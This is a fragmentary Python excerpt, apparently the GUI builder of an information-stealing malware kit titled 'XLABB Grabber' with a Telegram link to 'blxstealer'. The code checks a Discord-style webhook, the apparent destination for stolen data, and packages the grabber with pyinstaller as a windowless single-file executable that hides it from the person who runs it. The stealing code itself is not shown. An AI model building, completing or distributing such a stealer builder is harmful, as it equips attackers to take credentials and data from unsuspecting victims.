...
app = ctk.CTk()
app.title(f"t.me/blxstealer | XLABB Grabber")
...
def build_exe():
    ...
    if validate_webhook(webhook):
        ...
        build_command = f'pyinstaller xlabbgrabber.py --noconsole --onefile{icon_option}'
...
label = ctk.CTkLabel(master=app, text="XLABB Grabber", text_color=("red"), font=("Helvetica", 26))
